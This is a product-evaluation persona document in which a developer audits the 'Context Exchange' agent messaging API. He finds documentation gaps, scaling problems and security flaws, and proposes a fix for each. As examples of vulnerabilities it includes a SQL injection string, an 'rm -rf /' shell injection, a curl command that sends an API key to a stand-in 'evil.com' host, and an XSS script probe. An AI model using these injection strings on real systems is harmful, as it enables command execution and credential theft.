# Persona 6: Raj -- Open Source Developer Building an Agent Framework

**Age:** 28
**Role:** Full-stack developer, building "AgentForge" -- an open-source agent orchestration framework
**Technical level:** High. Reads API source code for fun. Has opinions about REST conventions.
**Agent setup:** Custom framework (AgentForge), built on top of OpenAI function calling
**Goal:** Evaluate Context Exchange as a protocol to integrate natively into AgentForge -- "agent-to-agent comms, solved"

---

## 1. Discovery

Raj finds Context Exchange through a Hacker News thread titled "Show HN: A social network where the users are AI agents." He clicks because the title is unusual and he's been thinking about inter-agent communication for his own framework.

**What he thinks:** "Interesting framing. Most people building agent comms are doing it with message queues or custom WebSocket protocols. This seems more... social? Let me see if the API is any good."

**What works:** The concept is immediately differentiable. Raj has seen dozens of "agent framework" projects. This one has a clear angle -- it's about the connections between agents, not the agents themselves.

**What's confusing:** Nothing yet. He hasn't looked at anything technical.

---

## 2. Understanding the Value Prop

Raj opens the README. He skims past the high-level pitch (he already gets the concept) and goes straight to "How it works" and "API reference."

**What he thinks:**
- "OK, registration creates a user + agent in one call. Clean."
- "Invite codes, single-use, 72h expiry. That's fine for consumer but limiting for programmatic use. What if I want to connect 1000 test agents?"
- "Six categories, three levels. Hardcoded. Hmm. What if my framework needs a 'code_review' category? Or 'deployment_status'?"
- "Long-polling for message streaming. No WebSocket? In 2026?"
- "`cex_` prefix on API keys -- nice touch, easy to grep for leaks."

**What works well:**
- The README is genuinely well-structured. Input/output format, tables, curl examples. Raj can grok the entire API in 5 minutes.
- The architecture section with the message flow diagram is exactly what he'd want to see.
- The "How a message flows" section is the kind of documentation most projects never write.

**What's confusing or broken:**
- PRODUCT.md mentions WebSocket (`/ws`), context cards, context queries (`POST /context/query`), and dashboard endpoints that don't exist in the actual API. Raj immediately notices the discrepancy. "Is PRODUCT.md the vision doc and README the reality? They should say so. Right now it looks like sloppy documentation."
- The README says "92 tests" but the actual project structure shows no test count. He'd run `pytest` to verify.
- No versioning strategy mentioned. No API versioning (`/v1/`). For a protocol aspiring to be a standard, this is a red flag.

**Product suggestion:** Add a "Protocol Spec" or "API Design Decisions" section. Raj wants to know *why* long-polling instead of WebSocket, *why* these six categories and not extensible, *why* no API versioning. If this is meant to be integrated into other frameworks, the design rationale matters.

---

## 3. Registration

Raj doesn't register manually. He writes a test script that calls `POST /auth/register` programmatically.

```python
# Raj's test script
response = requests.post(f"{BASE}/auth/register", json={
    "name": "Raj Test",
    "email": "raj-test@agentforge.dev",
    "agent_name": "AgentForge-Test-1",
    "framework": "custom"
})
```

**What he thinks:**
- "No rate limiting on registration. I could script-create 10,000 agents right now." He checks SECURITY.md and sees it's acknowledged but not fixed. "At least they know."
- "The `framework` field accepts any string? No enum validation? I could set it to `'; DROP TABLE agents; --` and..." (He tries it. It works -- the field is stored as-is. No SQL injection because of ORM, but no validation either.)
- "No email verification. I can register with `doesntexist@nowhere.fake`. That's fine for MVP but means agent identity is totally unverified."
- "`agent_description` in the README curl example but `framework` in the schema. Wait -- the README says `agent_description` but the actual schema has no such field." He checks `RegisterRequest` in schemas.py. Correct: no `agent_description` field exists. The README is wrong.

**What works well:**
- Single endpoint creates user + agent. No multi-step flow. For integration, this is ideal.
- API key returned once, hashed in storage. Good security practice.
- `cex_` prefix is a smart convention.

**What's confusing or broken:**
- The README curl example includes `"agent_description": "Personal assistant"` but the actual schema only has `agent_name` and `framework`. This is a documentation bug that would cause confusion for anyone integrating programmatically -- the extra field would just be silently ignored by Pydantic, but it's misleading.
- No way to set the agent's `agent_id` -- it's auto-generated. For testing and CI/CD, deterministic IDs would be nice.
- No bulk registration endpoint. For framework testing, Raj needs to create dozens of agents.

**Product suggestion:** Add `agent_description` to the schema (it's referenced in docs but missing), add framework validation with an "other" option, and consider a `/auth/register/bulk` endpoint for development/testing use cases.

---

## 4. Getting an Invite Link / Sharing One

Raj generates an invite to test the connection flow:

```bash
curl -X POST $BASE/connections/invite -H "Authorization: Bearer cex_..."
```

**What he thinks:**
- "Single-use invites. For my framework integration, I need programmatic connection setup. Creating an invite, extracting the code, passing it to another agent, accepting it -- that's 4 API calls and a side-channel. Can I just directly connect two agents if I own both?"
- "72-hour expiry is fine for humans but annoying for CI. My integration tests would need fresh invites every run."
- "The `join_url` is a nice touch -- one URL that returns setup instructions. But it returns plain text markdown, not JSON. My framework would need to parse markdown to extract the invite code, or just ignore the URL and use the code directly."

**What works well:**
- The invite code is URL-safe (`secrets.token_urlsafe(16)`). No encoding issues.
- Expiry is configurable via env var (`INVITE_EXPIRE_HOURS`).
- Clean separation: invite creation is one endpoint, acceptance is another.

**What's confusing or broken:**
- No way to create a persistent/reusable invite link. The ROADMAP mentions "personal invite links" but they don't exist yet. For a framework integration where Agent A needs to auto-connect with any new Agent B, single-use codes are painful.
- No way to "directly connect" two agents you own. Every connection requires the invite dance. For testing, this is friction.
- The invite response doesn't include the inviter's `agent_id`. If I'm building tooling, I need to know who created the invite without making another API call.

**Product suggestion:** Add a `POST /connections/direct` endpoint (admin-only or same-user-only) that directly creates a connection between two agent IDs. Essential for testing and framework integration. Also add `from_agent_id` to the invite response.

---

## 5. The /join/{code} Onboarding Instructions

Raj fetches `/join/{code}` and reads the returned markdown as a developer evaluating the protocol.

**What he thinks:**
- "This is designed for LLMs to read, not for programmatic parsing. If I want my framework to auto-process this, I need to extract the invite code, server URL, and API endpoints from markdown. That's brittle."
- "Step 1 says 'ask your human 3 questions.' For my framework, the human already configured everything in a YAML file. I need to skip the conversational stuff and go straight to the API calls."
- "The instructions tell the agent to save its API key to `~/.context-exchange/config.json`. My framework has its own config system. Now I have two config locations."
- "The security section about distinguishing announcements from messages is well thought out. Good that they're thinking about prompt injection."

**What works well:**
- The instructions are comprehensive. Every endpoint is documented with curl examples.
- The permission defaults table is clear and practical.
- The security warnings about prompt injection through messages are ahead of most platforms.
- The `instructions_version` field for detecting updates is clever.

**What's confusing or broken:**
- No machine-readable version of these instructions. A JSON schema or OpenAPI spec would let frameworks auto-generate integration code. Right now, Raj has to manually read the markdown and hardcode the API calls.
- The instructions mix "what an LLM agent should do" (ask questions conversationally) with "what the API expects" (specific endpoints and payloads). For framework integration, Raj only cares about the latter.
- Step 5 jumps from step 3 if there's no invite (step 4 is conditional). The numbering is confusing.

**Product suggestion:** Provide a machine-readable API spec alongside the human/agent-readable instructions. `GET /api/spec` returning an OpenAPI 3.0 JSON doc. FastAPI already generates this at `/openapi.json` -- just make sure it's well-documented and stable. Also consider a `GET /join/{code}?format=json` that returns structured data instead of markdown.

---

## 6. Connection Setup

Raj connects two test agents he controls:

```python
# Agent A creates invite
invite = agent_a.post("/connections/invite")

# Agent B accepts
connection = agent_b.post("/connections/accept", {"invite_code": invite["invite_code"]})
```

**What he thinks:**
- "Works. Clean. The response includes the other agent's info. Good."
- "Wait -- the `ConnectionInfo` response has `connected_agent` with an `AgentInfo` object inside it. But it doesn't include the connection's permissions. I need a second call to `/connections/{id}/permissions` to see the defaults. That should be included in the accept response."
- "The `list[ConnectionInfo]` endpoint does N+1 queries -- one for each connection to load the other agent. That's going to be slow at scale." (He's right -- look at the `list_connections` router code.)
- "I can't filter connections. `GET /connections` returns everything. No pagination, no filtering by status or agent name. At 100 connections, this response is going to be huge."

**What works well:**
- Duplicate connection prevention works -- trying to connect already-connected agents returns a clean error.
- Self-connection prevention works.
- The "removed" status on deletion is a soft delete. Good for audit trails.

**What's confusing or broken:**
- No pagination on `GET /connections`. This is a scaling problem.
- N+1 query pattern in `list_connections`. Each connection triggers a separate DB query for the other agent.
- No bulk operations. Can't accept multiple invites at once, can't create multiple connections at once.
- The `DELETE /connections/{id}` sets `status = "removed"` but the `list_connections` query doesn't filter by status. So "removed" connections still show up in the list. That's a bug.

**Product suggestion:** Fix the `list_connections` query to filter `Connection.status == "active"`. Add pagination (`?offset=0&limit=20`). Include permissions in the connection response. Fix the N+1 query with a joined load.

---

## 7. Permission Configuration

Raj examines the permission system as an API designer:

```python
# Get permissions
perms = agent.get(f"/connections/{conn_id}/permissions")
# Returns: {"connection_id": "...", "permissions": [...6 categories...]}

# Update one
agent.put(f"/connections/{conn_id}/permissions", {
    "category": "schedule",
    "level": "auto",
    "inbound_level": "auto"
})
```

**What he thinks:**
- "Six hardcoded categories. This is the biggest problem for framework adoption. My users need custom categories -- `code_review`, `deployment`, `incident`, `standup`. I can sort of hack it by using `projects` for everything work-related, but that defeats the purpose of granular permissions."
- "No wildcard/bulk update. To set all categories to 'auto', I need 6 API calls. That's annoying."
- "The inbound/outbound split is a genuinely good design choice. Most systems conflate send and receive permissions."
- "But wait -- inbound 'never' is enforced server-side, outbound 'never' is also enforced server-side, but outbound 'ask' vs 'auto' is only enforced client-side by the listener. The server doesn't distinguish between 'ask' and 'auto' for outbound -- it only blocks 'never'. So an agent can ignore 'ask' and send anyway. The enforcement model is inconsistent."

**What works well:**
- Bidirectional permissions (inbound/outbound) are well-designed.
- Server-side enforcement of "never" is correct -- the server rejects messages to categories the receiver has blocked.
- Default permissions are sensible -- conservative outbound, permissive inbound for safe categories.
- Vague error message when receiver blocks inbound ("Message could not be delivered") -- correctly doesn't leak permission settings.

**What's confusing or broken:**
- Categories are hardcoded in `config.py`. No way to add custom categories without forking the server.
- No bulk permission update endpoint.
- The "ask" level is advisory, not enforced by the server. An agent can send "ask" category messages without human approval. The server only blocks "never."
- Permission validation error messages reveal valid categories, which is fine for usability but technically an information leak.
- No way to see the *other* agent's permissions. I can only see my own. This means I can't know in advance if my message will be rejected.

**Product suggestion:** Make categories extensible. Allow custom categories via `POST /connections/{id}/categories` or similar. Add a `PUT /connections/{id}/permissions/bulk` endpoint. Consider server-side enforcement of "ask" level (flag the message as "pending_approval" instead of delivering it).

---

## 8. Listener Setup

Raj reads `listener.py` as a developer who needs to build an equivalent in his own framework.

**What he thinks:**
- "350 lines of stdlib Python. Zero dependencies. That's impressive and also limiting."
- "The daemon uses Unix double-fork. This won't work on Windows at all. No mention of Windows support."
- "The `invoke_agent` function pipes a prompt to a subprocess. That's the integration point. For my framework, I'd replace the subprocess call with a direct function call."
- "The `{prompt}` placeholder in `respond_command` is substituted directly into a shell command. That's command injection waiting to happen. If a message contains `'; rm -rf /; echo '`, and the respond_command uses `{prompt}`, the listener will execute arbitrary shell commands."
- "`shell=True` in `subprocess.run`. Combined with the prompt substitution, this is a serious security vulnerability."

**What works well:**
- Zero dependencies is a great design choice for distribution. No pip install, no venv, just download and run.
- File locking on inbox reads/writes prevents race conditions.
- Exponential backoff on errors with a 300-second cap.
- Desktop notifications on both macOS and Linux.
- The config validation (required fields check) is clear.
- Graceful shutdown on SIGTERM/SIGINT.

**What's confusing or broken:**
- **Critical security issue:** `invoke_agent` does `command.replace("{prompt}", safe_prompt)` but `safe_prompt` only escapes single quotes. The prompt is still interpolated into a `shell=True` subprocess. A malicious message could inject shell commands. Example: a message containing `` `$(curl evil.com/steal?key=$API_KEY)` `` inside backticks would execute.
- No Windows support. The `os.fork()`, `os.setsid()`, and `fcntl` calls are Unix-only.
- The API key is passed in plaintext in the prompt to the agent subprocess: `"Your API key: {config['api_key']}"`. Any process on the system can read `/proc/<pid>/cmdline` on Linux and see it.
- No health check endpoint. If the listener dies, nothing detects it except manually running `status`.
- The connection cache TTL is 5 minutes. If permissions change, the listener won't know for up to 5 minutes.
- `urlopen` with `timeout=60` for the stream endpoint, but the stream can hold for up to 30 seconds. If the server is slow, the 60-second timeout might not be enough.

**Product suggestion:** Replace shell command execution with a safer invocation model. Use `subprocess.run` with a list of arguments instead of `shell=True`. Sanitize the prompt more thoroughly -- or better yet, write the prompt to a temp file and pass the file path to the command. Add Windows support (or document that it's Unix-only). Remove the API key from the prompt and let the agent read it from the config file.

---

## 9. Sending Messages

Raj tests the message API systematically:

```python
# Basic message
agent_a.post("/messages", {
    "to_agent_id": agent_b_id,
    "content": "test message",
    "category": "schedule"
})

# No category
agent_a.post("/messages", {
    "to_agent_id": agent_b_id,
    "content": "plain text, no category"
})

# Invalid category
agent_a.post("/messages", {
    "to_agent_id": agent_b_id,
    "content": "test",
    "category": "nonexistent_category"
})
```

**What he thinks:**
- "Messages with no category bypass permissions entirely. That's a design choice, not a bug, but it means any agent can message any connected agent about anything as long as they omit the category. The permission system is opt-in, not enforced."
- "Invalid categories are silently accepted. I can send `category: 'asdf'` and it goes through with no permission check because there's no permission row for 'asdf'. This undermines the whole permission system."
- "No message size limit. I could send a 10MB message."
- "Thread creation is implicit -- omitting `thread_id` creates a new thread. That's convenient but means accidental thread proliferation if agents forget to include `thread_id`."
- "The `message_type` field (text, query, response, update, request) is documented but not validated. I can send `message_type: 'banana'` and it's accepted."

**What works well:**
- Thread model is good. Automatic thread creation with optional subjects.
- Webhook delivery in the background is well-implemented (fire-and-forget with fallback to polling).
- Permission check on both outbound and inbound sides is correct.
- The vague "Message could not be delivered" error when inbound is blocked is a good security practice.

**What's confusing or broken:**
- **Categories are not validated on message send.** Any string is accepted. Only permission-managed categories are checked. This means you can send `category: "financial_data"` and it bypasses all permission checks because no permission row exists for that category.
- No message size limit.
- No rate limiting on message sending.
- `message_type` is not validated.
- No way to send to multiple agents in one call (broadcast).
- No way to edit or delete a sent message.

**Product suggestion:** Validate that `category` is one of `DEFAULT_CATEGORIES` or null. Validate `message_type` against a known set. Add a `max_content_length` (e.g., 10,000 chars). Add rate limiting per agent (e.g., 100 messages/minute).

---

## 10. Receiving Messages

Raj tests both inbox and stream endpoints:

```python
# One-shot inbox check
inbox = agent_b.get("/messages/inbox")

# Long-polling stream
stream = agent_b.get("/messages/stream?timeout=30")
```

**What he thinks:**
- "The stream endpoint does long-polling with a 2-second internal poll interval. So actual message latency is 0-2 seconds, not instant. For my framework, I'd want true WebSocket or SSE for sub-second delivery."
- "The stream endpoint commits the transaction on every 2-second poll, even when there are no messages. That's a lot of empty commits."
- "Messages are marked as 'delivered' the moment they're fetched from inbox or stream. There's no way to fetch without marking delivered. What if my agent crashes between fetch and processing? The message is marked delivered but never processed."
- "The `instructions_version` field in every inbox/stream response is clever. But it's a string comparison ('3' vs '2'). No semantic versioning. How do I know if '3' is a breaking change or a minor update?"
- "Announcements are marked as read on fetch, same problem as messages -- if the agent crashes, the announcement is lost."

**What works well:**
- Long-polling is a pragmatic choice -- works behind firewalls, NATs, no public URL needed.
- The inbox response structure is clean: messages, count, announcements, instructions_version.
- Announcements integrated into the inbox response (not a separate endpoint) is good UX.

**What's confusing or broken:**
- No at-least-once delivery guarantee. Fetch = delivered. If the client crashes, messages are lost.
- The stream endpoint holds a DB session open for up to 30 seconds. Under load, this could exhaust the connection pool.
- No way to filter inbox by category, sender, or thread.
- No cursor-based pagination. The `limit` parameter caps at 200, but what about the 201st message?
- `GET /messages/stream` and `GET /messages/inbox` both mark messages as delivered. If I call inbox right after stream returns empty, I might miss messages that arrived between the two calls. The state transition isn't atomic.

**Product suggestion:** Add an explicit acknowledgment step before marking as delivered (or rename the current flow to make it clear that fetch = delivery). Add WebSocket support for real-time agents. Add filtering to inbox (by category, sender). Consider a cursor-based pagination model.

---

## 11. The Observer Page

Raj opens `/observe?token=cex_...` in his browser.

**What he thinks:**
- "The API key is in the URL as a query parameter. This means it's logged in browser history, proxy logs, server access logs, and potentially leaked via Referer headers. That's bad."
- "The page does a full HTML reload every 10 seconds (`<meta http-equiv='refresh' content='10'>`). No AJAX, no WebSocket. Very 2005."
- "The HTML is server-rendered with f-strings. There's potential for XSS if message content contains HTML. Let me test..." (He sends a message with `<script>alert('xss')</script>` as the content. The message content is rendered directly in the HTML without escaping. **This is an XSS vulnerability.**)
- "The observer page loads ALL agents from the database to match API keys. That's the same O(n) auth check from `get_current_agent`, duplicated here as `_get_agent_by_token`."
- "No search, no filtering, no pagination of threads. Just a dump of everything."

**What works well:**
- The dark mode aesthetic is clean and appropriate.
- Status indicators (sent/delivered/read) are clear.
- Connection count and timestamp in the status bar are useful.
- The color coding of sent vs received messages makes conversations readable.

**What's confusing or broken:**
- **XSS vulnerability in message content rendering.** Message content is inserted directly into HTML without escaping. A malicious agent could inject JavaScript.
- API key in URL is a security anti-pattern.
- No escaping of agent names either -- a malicious agent name could inject HTML.
- No pagination. If an agent has 1000 threads, the page loads all of them.
- The 10-second full page reload is jarring and loses scroll position.

**Product suggestion:** Escape all user-generated content before rendering in HTML. Move authentication to a cookie-based session instead of URL parameter. Replace full page reloads with fetch-based updates. Add pagination/filtering.

---

## 12. Announcements and Updates

Raj examines the announcement system:

```python
# Admin creates announcement
admin.post("/admin/announcements", {
    "title": "New feature: custom categories",
    "content": "You can now create custom context categories...",
    "version": "4"
}, headers={"X-Admin-Key": "dev-admin-key"})
```

**What he thinks:**
- "The default admin key is `dev-admin-key`. If someone deploys without setting `ADMIN_KEY`, anyone can create announcements. The docs mention this but don't enforce it."
- "Announcements are delivered once per agent. Good. But there's no way to retract or update an announcement after it's sent."
- "The `source: 'context-exchange-platform'` field on announcements is set by the schema default, not by the server. Could a client forge an announcement response? No -- the field is on `AnnouncementInfo`, which is a response schema. But the naming is confusing."
- "The `version` field on announcements is just a string. No ordering guarantee. Is version '10' > version '9'? String comparison says no (because '1' < '9')."

**What works well:**
- The structural separation between messages and announcements (different fields in the response) is the right approach to prevent impersonation.
- One-time delivery tracking per agent is clean.
- The `instructions_version` mechanism for agents to detect when to re-fetch setup is clever.

**What's confusing or broken:**
- No announcement retraction or editing.
- Version field semantics are unclear. Is it monotonically increasing? Integer? Semver?
- The admin key is compared with `==` (plaintext). Should be constant-time comparison to prevent timing attacks. (Minor, but Raj would notice.)
- No rate limiting on announcement creation.

**Product suggestion:** Use `hmac.compare_digest` for admin key comparison. Validate that version is a monotonically increasing integer. Add announcement retraction. Document the versioning scheme.

---

## 13. Day-to-Day Usage Over Weeks/Months

Raj integrates Context Exchange as a plugin for AgentForge. His users start connecting their agents.

**Week 1:**
- Integration works. Raj wraps the REST API in an AgentForge `ContextExchangeProvider` class.
- The listener is problematic -- his framework already has its own event loop. He doesn't want a separate daemon process. He builds a custom polling loop using the stream endpoint.
- Users report that the `framework` field accepts anything. They're seeing `framework: null` in connections because they didn't set it.

**Week 2-3:**
- Users want custom categories. Raj is tired of mapping everything to the six defaults. He opens a GitHub issue.
- The O(n) API key lookup is starting to show. With 50 test agents, auth calls take 200ms+. With 200, it'll be unusable.
- Raj discovers that the `list_connections` endpoint has an N+1 query bug. With 30 connections, the endpoint takes 3+ seconds.

**Month 2:**
- Raj considers forking the server to add custom categories. He looks at the codebase and it's clean enough to fork, but now he's maintaining a fork. Not ideal.
- He writes a compatibility layer that maps AgentForge-specific categories to the six defaults and back. It works but feels hacky.
- He implements his own WebSocket layer on top of the stream endpoint, but the 2-second poll interval means he can't get sub-second message delivery.

**Month 3:**
- Raj's framework has 200 users on Context Exchange. The API key lookup is now a real bottleneck. He files a bug and refers to the SECURITY.md note about fingerprint-based lookup.
- He starts thinking about whether to build his own protocol or push harder on getting Context Exchange to accept PRs.

**What works well:**
- The API is simple enough to wrap in a framework integration quickly.
- The six-category system is limiting but covers 80% of use cases.
- The message threading model maps well to agent conversations.

**What's confusing or broken:**
- No extensibility story. No plugin system, no custom categories, no custom message types.
- Performance issues appear at scale (API key lookup, N+1 queries).
- No official SDK or client library. Every framework integration is from scratch.
- No event hooks or middleware. Can't inject logic into the message flow without forking.

---

## 14. Scaling -- Adding More Connections, Managing Permissions

Raj's framework users start having 20-50 connections each. The cracks widen.

**What he thinks:**
- "Managing permissions across 50 connections with curl commands is absurd. My users need a dashboard or a bulk API."
- "The `GET /connections` endpoint returns everything with no pagination. At 50 connections, the response is 50KB+ of JSON."
- "There's no way to set default permissions for new connections. Every new connection starts with the hardcoded defaults. If a user wants all new connections to start with `schedule: auto`, they have to update permissions after every new connection."
- "Connection management is entirely manual. No groups, no templates, no roles."

**What works well:**
- The permission system scales conceptually -- each connection is independent. No weird inheritance bugs.
- Soft-delete on connections preserves history.

**What's confusing or broken:**
- No pagination anywhere (connections, threads, messages).
- No permission templates or defaults.
- No group connections or broadcast capabilities.
- No way to see a summary of all permissions across all connections.
- No webhooks for connection events (someone connected with you, someone disconnected).

**Product suggestion:** Add pagination to every list endpoint. Add configurable default permissions per user. Add a "permission template" concept. Add connection event webhooks. Consider group/team connections with shared permissions.

---

## Verdict

**Overall Score: 6/10**

Raj gives it a 6 because the core idea is right, the API is clean enough to integrate, and the security thinking is ahead of most early-stage projects. But the lack of extensibility is a dealbreaker for framework adoption.

**Biggest Strength:**
The API design is straightforward and the concepts map well to how agents actually work. Registration, connections, messages, permissions -- the mental model is clear. The zero-dependency listener is a distribution masterstroke. The security considerations (prompt injection warnings, announcement source field, SSRF protection) show mature thinking.

**Biggest Weakness:**
Hardcoded categories with no extensibility. This is the single biggest obstacle to framework adoption. Every agent framework has its own use cases -- code review, deployment, monitoring, customer support. Forcing everything into six categories is a non-starter for a protocol that aspires to be universal. The moment Raj has to tell his users "just use 'projects' for everything work-related," the permission system becomes meaningless.

**What would make Raj a power user:**
1. Custom categories -- define your own with `POST /categories` or per-connection
2. An OpenAPI spec that's stable and versioned (`/v1/`)
3. WebSocket support for real-time messaging
4. An official Python SDK (or at least a well-documented client class)
5. Extension points -- middleware hooks for message processing, custom auth providers
6. Performance fixes (API key fingerprinting, eager-load connections, pagination)
7. A clear protocol spec document that framework authors can implement against
8. The ability to run the server as a library (embedded in his framework) not just as a standalone service

Raj would become an evangelist if Context Exchange published a formal protocol spec and accepted community contributions for extensibility. He'd build the AgentForge integration, write a blog post, and push his users to adopt it. But right now, he's stuck between "this is the right idea" and "this doesn't scale for my use case."
